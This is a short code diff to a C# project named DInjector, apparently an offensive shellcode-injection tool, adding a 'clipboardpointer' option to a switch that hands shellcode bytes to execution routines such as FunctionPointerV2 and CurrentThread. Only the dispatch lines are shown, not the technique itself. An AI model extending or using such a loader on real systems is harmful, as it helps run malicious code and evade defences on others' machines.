@@ -95,6 +95,9 @@ namespace DInjector
                 case "functionpointerv2":
                     FunctionPointerV2.Execute(shellcodeBytes);
                     break;
+                case "clipboardpointer":
+                    ClipboardPointer.Execute(shellcodeBytes);
+                    break;
                 case "currentthread":
                     CurrentThread.Execute(shellcodeBytes);
                     break;
